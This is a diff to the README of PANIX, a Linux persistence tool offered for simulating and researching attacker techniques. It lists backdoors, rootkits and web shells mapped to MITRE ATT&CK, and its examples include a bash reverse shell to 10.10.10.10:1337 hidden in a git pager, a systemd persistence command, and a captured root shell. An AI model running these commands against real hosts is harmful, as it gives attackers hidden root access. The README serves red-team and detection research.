@@ -19,7 +19,7 @@ PANIX provides a versatile suite of features for simulating and researching Linu
 | **Backdoor User**                | Creates a backdoor user with `UID=0`, granting root privileges.                         | ✔️    | ❌     |
 | **Backdoored /etc/passwd**       | Directly adds a malicious user entry to `/etc/passwd`.                                  | ✔️    | ❌     |
 | **Backdoored /etc/init.d**       | Establishes persistence via `SysV Init` scripts in `/etc/init.d`.                       | ✔️    | ❌     |
-| **Backdoored /etc/rc.local**     | Establishes persistence via the run control script in `/etc/rc.local`.                  | ✔️    | ❌     |
+| **Backdoored /etc/rc.local**     | Establishes persistence via run control scripts in `/etc/rc.local`.                     | ✔️    | ❌     |
 | **Bind Shell**                   | Executes a pre-compiled/LOLBin bind shell for remote access.                            | ✔️    | ✔️     |
 | **Capabilities Backdoor**        | Adds specific capabilities to binaries to maintain persistence.                         | ✔️    | ❌     |
 | **Cron Job Persistence**         | Sets up cron jobs to ensure persistence across reboots.                                 | ✔️    | ✔️     |
@@ -27,24 +27,24 @@ PANIX provides a versatile suite of features for simulating and researching Linu
 | **Diamorphine Rootkit**          | Installs the Diamorphine Loadable Kernel Module (LKM) Rootkit.                          | ✔️    | ❌     |
 | **Git Persistence**              | Utilizes Git hooks or pagers to persist within Git repositories.                        | ✔️    | ✔️     |
 | **Generator Persistence**        | Leverages systemd generators to create persistent services.                             | ✔️    | ❌     |
-| **Malicious Container Backdoor** | Deploys a Docker container designed for host escape and persistence.                    | ✔️    | ✔️     |
+| **Malicious Container Backdoor** | Deploys a Docker container designed to host escape.                                     | ✔️    | ✔️     |
 | **Malicious Package Backdoor**   | Installs malicious DPKG/RPM packages to achieve persistence.                            | ✔️    | ❌     |
 | **LD_PRELOAD Backdoor**          | Uses `LD_PRELOAD` to inject malicious libraries for persistence.                        | ✔️    | ❌     |
 | **LKM Backdoor**                 | Loads a malicious Kernel Module (LKM) to maintain low-level persistence.                | ✔️    | ❌     |
-| **MOTD Backdoor**                | Alters the Message of the Day (MOTD) to execute persistence scripts.                    | ✔️    | ❌     |
-| **Package Manager Persistence**  | Manipulates `APT/YUM/DNF` to establish persistence on package manager usage.            | ✔️    | ❌     |
-| **PAM Persistence**              | Installs a PAM backdoor using a rogue module or pam_exec configuration.                 | ✔️    | ❌     |
+| **MOTD Backdoor**                | Alters Message of the Day (MOTD) to establish persistence.                              | ✔️    | ❌     |
+| **Package Manager Persistence**  | Manipulates `APT/YUM/DNF` to establish persistence on usage.                            | ✔️    | ❌     |
+| **PAM Persistence**              | Installs a PAM backdoor using a rogue module or pam_exec.                               | ✔️    | ❌     |
 | **Password Change**              | Changes user passwords to secure backdoor accounts.                                     | ✔️    | ❌     |
 | **Reverse Shell**                | Establishes a reverse shell, supporting multiple LOLBins for remote access.             | ✔️    | ✔️     |
 | **Shell Profile Persistence**    | Modifies shell profiles to execute persistence scripts upon user login.                 | ✔️    | ✔️     |
 | **SSH Key Persistence**          | Manipulates SSH keys to maintain persistent access via SSH.                             | ✔️    | ✔️     |
-| **Sudoers Backdoor**             | Alters the `/etc/sudoers` file to grant elevated privileges persistently.               | ✔️    | ❌     |
-| **SUID Backdoor**                | Sets the SUID bit on binaries to persist through backdoors with elevated privileges.    | ✔️    | ❌     |
-| **System Binary Backdoor**       | Wraps system binaries to include persistent backdoor functionality.                     | ✔️    | ❌     |
+| **Sudoers Backdoor**             | Alters the `/etc/sudoers` file to grant elevated privileges.                            | ✔️    | ❌     |
+| **SUID Backdoor**                | Backdoors binaries by setting the SUID bit.                                             | ✔️    | ❌     |
+| **System Binary Backdoor**       | Wraps system binaries to include backdoor functionality.                                | ✔️    | ❌     |
 | **Systemd Service Persistence**  | Creates systemd services that ensure persistence across reboots.                        | ✔️    | ✔️     |
-| **Udev Persistence**             | Utilizes Udev drivers to maintain persistence at the hardware interaction level.        | ✔️    | ❌     |
-| **Web Shell Persistence**        | Deploys rogue web servers for persistent remote access via web interfaces.              | ✔️    | ✔️     |
-| **XDG Autostart Persistence**    | Employs XDG autostart directories to execute persistence scripts upon user login.       | ✔️    | ✔️     |
+| **Udev Persistence**             | Utilizes Udev drivers to persist at the hardware interaction level.                     | ✔️    | ❌     |
+| **Web Shell Persistence**        | Deploys rogue web servers for remote access via web interfaces.                         | ✔️    | ✔️     |
+| **XDG Autostart Persistence**    | Employs XDG autostart directories to persist upon user login.                           | ✔️    | ✔️     |
 
 ![](https://i.imgur.com/waxVImv.png)
 
@@ -163,6 +163,7 @@ Root User Options:
 # Examples
 The script should be largely self-explanatory, however, this section will show a few examples of how to work with PANIX.
 
+### Help & Example Menu
 Every persistence mechanism has a separate help menu:
 
 ```
@@ -180,6 +181,7 @@ Usage: ./panix.sh --udev [OPTIONS]
 ```
 
 Every persistence mechanism also has an `--examples` flag that shows default and custom examples, aiding in crafting the command that works for you.
+
 ```
 ruben@ubuntu2204:~$ ./panix.sh --git --examples
 Examples:
@@ -191,7 +193,10 @@ Examples:
 
 ./panix.sh --git --custom --command "nohup setsid /bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/1337 0>&1' > /dev/null 2>&1 & ${PAGER:-less}" --path "~/.gitconfig --pager"
 ```
+
+### Execution
 Most of the persistence mechanisms are very simple, and will (hopefully) not require much explanation. For example, systemd persistence can be set up simply through executing:
+
 ```
 ruben@ubuntu2204:~$ sudo ./panix.sh --systemd --default --ip 10.10.10.10 --port 1337
 Service file created successfully!
@@ -252,7 +257,9 @@ connect to [192.168.211.131] from (UNKNOWN) [192.168.211.130] 43400
 root@ubuntu2204:~#
 ```
 
+### Revert Mechanism
 PANIX can clean its mess through the `--revert` command. Both for seperate modules:
+
 ```
 ruben@ubuntu2204:~$ sudo ./panix.sh --revert rootkit
 
@@ -308,6 +315,7 @@ Error: 'at' binary is not present. Cannot revert 'at' jobs.
 [+] Reversion of all modules complete.
 ```
 
+### MITRE ATT&CK Matrix
 PANIX has a built-in MITRE ATT&CK matrix that displays the techniques and sub-techniques available. 
 
 ```
@@ -317,37 +325,37 @@ MITRE ATT&CK Matrix - Persistence Techniques Supported by PANIX
 
 Persistence Method        Technique Name                           Technique ID    Sub-technique Name                       Sub-technique ID     URL                                                                   
 -------------------       --------------                           -------------   -----------------                        ---------------      ---------------------------------------------                         
---at                      Scheduled Task                           T1053           At                                       T1053.002            https://attack.mitre.org/techniques/T1053/002                         
---authorized-keys         Account Manipulation                     T1098           SSH Authorized Keys                      T1098.004            https://attack.mitre.org/techniques/T1098/004                         
---backdoor-user           Create Account                           T1136           Local Account                            T1136.001            https://attack.mitre.org/techniques/T1136/001                         
---bind-shell              Command and Scripting Interpreter        T1059           Unix Shell                               T1059.004            https://attack.mitre.org/techniques/T1059/004                         
---cap                     Abuse Elevation Control Mechanism        T1548           N/A                                      N/A                  https://attack.mitre.org/techniques/T1548                             
---create-user             Create Account                           T1136           Local Account                            T1136.001            https://attack.mitre.org/techniques/T1136/001                         
---cron                    Scheduled Task                           T1053           Cron                                     T1053.003            https://attack.mitre.org/techniques/T1053/003                         
---generator               Create or Modify System Process          T1543           Systemd Service                          T1543.002            https://attack.mitre.org/techniques/T1543/002                         
---git                     Event Triggered Execution                T1546           N/A                                      N/A                  https://attack.mitre.org/techniques/T1546                             
---initd                   Boot or Logon Initialization Scripts     T1037           N/A                                      N/A                  https://attack.mitre.org/techniques/T1037                             
---ld-preload              Hijack Execution Flow                    T1574           Dynamic Linker Hijacking                 T1574.006            https://attack.mitre.org/techniques/T1574/006                         
---lkm                     Boot or Logon Autostart Execution        T1547           Kernel Modules and Extensions            T1547.006            https://attack.mitre.org/techniques/T1547/006                         
---malicious-container     Escape to Host                           T1610           N/A                                      N/A                  https://attack.mitre.org/techniques/T1610                             
---malicious-package       Event Triggered Execution                T1546           Installer Packages                       T1546.016            https://attack.mitre.org/techniques/T1546/016                         
---motd                    Boot or Logon Initialization Scripts     T1037           N/A                                      N/A                  https://attack.mitre.org/techniques/T1037                             
---package-manager         Event Triggered Execution                T1546           Installer Packages                       T1546.016            https://attack.mitre.org/techniques/T1546/016                         
---pam                     Modify Authentication Process            T1556           Pluggable Authentication Modules         T1556.003            https://attack.mitre.org/techniques/T1556/003                         
---passwd-user             Account Manipulation                     T1098           N/A                                      N/A                  https://attack.mitre.org/techniques/T1098                             
---password-change         Account Manipulation                     T1098           N/A                                      N/A                  https://attack.mitre.org/techniques/T1098                             
---rc-local                Boot or Logon Initialization Scripts     T1037           RC Scripts                               T1037.004            https://attack.mitre.org/techniques/T1037/004                         
---reverse-shell           Command and Scripting Interpreter        T1059           Unix Shell                               T1059.004            https://attack.mitre.org/techniques/T1059/004                         
---rootkit                 Rootkit                                  T1014           N/A                                      N/A                  https://attack.mitre.org/techniques/T1014                             
---shell-profile           Event Triggered Execution                T1546           Unix Shell Configuration Modification    T1546.004            https://attack.mitre.org/techniques/T1546/004                         
---ssh-key                 Account Manipulation                     T1098           SSH Authorized Keys                      T1098.004            https://attack.mitre.org/techniques/T1098/004                         
---sudoers                 Abuse Elevation Control Mechanism        T1548           Sudo and Sudo Caching                    T1548.003            https://attack.mitre.org/techniques/T1548/003                         
---suid                    Abuse Elevation Control Mechanism        T1548           Setuid and Setgid                        T1548.001            https://attack.mitre.org/techniques/T1548/001                         
---system-binary           Compromise Host Software Binary          T1554           N/A                                      N/A                  https://attack.mitre.org/techniques/T1554                             
---systemd                 Create or Modify System Process          T1543           Systemd Service                          T1543.002            https://attack.mitre.org/techniques/T1543/002                         
---udev                    Event Triggered Execution                T1546           Udev Rules                               T1546.017            https://attack.mitre.org/techniques/T1546/017                         
---web-shell               Server Software Component                T1505           Web Shell                                T1505.003            https://attack.mitre.org/techniques/T1505/003                         
---xdg                     Boot or Logon Autostart Execution        T1547           XDG Autostart Entries                    T1547.013            https://attack.mitre.org/techniques/T1547/013                         
+--at                      Scheduled Task                           T1053           At                                       T1053.002            https://attack.mitre.org/techniques/T1053/002
+--authorized-keys         Account Manipulation                     T1098           SSH Authorized Keys                      T1098.004            https://attack.mitre.org/techniques/T1098/004
+--backdoor-user           Create Account                           T1136           Local Account                            T1136.001            https://attack.mitre.org/techniques/T1136/001
+--bind-shell              Command and Scripting Interpreter        T1059           Unix Shell                               T1059.004            https://attack.mitre.org/techniques/T1059/004
+--cap                     Abuse Elevation Control Mechanism        T1548           N/A                                      N/A                  https://attack.mitre.org/techniques/T1548
+--create-user             Create Account                           T1136           Local Account                            T1136.001            https://attack.mitre.org/techniques/T1136/001
+--cron                    Scheduled Task                           T1053           Cron                                     T1053.003            https://attack.mitre.org/techniques/T1053/003
+--generator               Create or Modify System Process          T1543           Systemd Service                          T1543.002            https://attack.mitre.org/techniques/T1543/002
+--git                     Event Triggered Execution                T1546           N/A                                      N/A                  https://attack.mitre.org/techniques/T1546
+--initd                   Boot or Logon Initialization Scripts     T1037           N/A                                      N/A                  https://attack.mitre.org/techniques/T1037
+--ld-preload              Hijack Execution Flow                    T1574           Dynamic Linker Hijacking                 T1574.006            https://attack.mitre.org/techniques/T1574/006
+--lkm                     Boot or Logon Autostart Execution        T1547           Kernel Modules and Extensions            T1547.006            https://attack.mitre.org/techniques/T1547/006
+--malicious-container     Escape to Host                           T1610           N/A                                      N/A                  https://attack.mitre.org/techniques/T1610
+--malicious-package       Event Triggered Execution                T1546           Installer Packages                       T1546.016            https://attack.mitre.org/techniques/T1546/016
+--motd                    Boot or Logon Initialization Scripts     T1037           N/A                                      N/A                  https://attack.mitre.org/techniques/T1037
+--package-manager         Event Triggered Execution                T1546           Installer Packages                       T1546.016            https://attack.mitre.org/techniques/T1546/016
+--pam                     Modify Authentication Process            T1556           Pluggable Authentication Modules         T1556.003            https://attack.mitre.org/techniques/T1556/003
+--passwd-user             Account Manipulation                     T1098           N/A                                      N/A                  https://attack.mitre.org/techniques/T1098
+--password-change         Account Manipulation                     T1098           N/A                                      N/A                  https://attack.mitre.org/techniques/T1098
+--rc-local                Boot or Logon Initialization Scripts     T1037           RC Scripts                               T1037.004            https://attack.mitre.org/techniques/T1037/004
+--reverse-shell           Command and Scripting Interpreter        T1059           Unix Shell                               T1059.004            https://attack.mitre.org/techniques/T1059/004
+--rootkit                 Rootkit                                  T1014           N/A                                      N/A                  https://attack.mitre.org/techniques/T1014
+--shell-profile           Event Triggered Execution                T1546           Unix Shell Configuration Modification    T1546.004            https://attack.mitre.org/techniques/T1546/004
+--ssh-key                 Account Manipulation                     T1098           SSH Authorized Keys                      T1098.004            https://attack.mitre.org/techniques/T1098/004
+--sudoers                 Abuse Elevation Control Mechanism        T1548           Sudo and Sudo Caching                    T1548.003            https://attack.mitre.org/techniques/T1548/003
+--suid                    Abuse Elevation Control Mechanism        T1548           Setuid and Setgid                        T1548.001            https://attack.mitre.org/techniques/T1548/001
+--system-binary           Compromise Host Software Binary          T1554           N/A                                      N/A                  https://attack.mitre.org/techniques/T1554
+--systemd                 Create or Modify System Process          T1543           Systemd Service                          T1543.002            https://attack.mitre.org/techniques/T1543/002
+--udev                    Event Triggered Execution                T1546           Udev Rules                               T1546.017            https://attack.mitre.org/techniques/T1546/017
+--web-shell               Server Software Component                T1505           Web Shell                                T1505.003            https://attack.mitre.org/techniques/T1505/003
+--xdg                     Boot or Logon Autostart Execution        T1547           XDG Autostart Entries                    T1547.013            https://attack.mitre.org/techniques/T1547/013                     
 
 Legend:
 Technique: High-level MITRE ATT&CK technique.
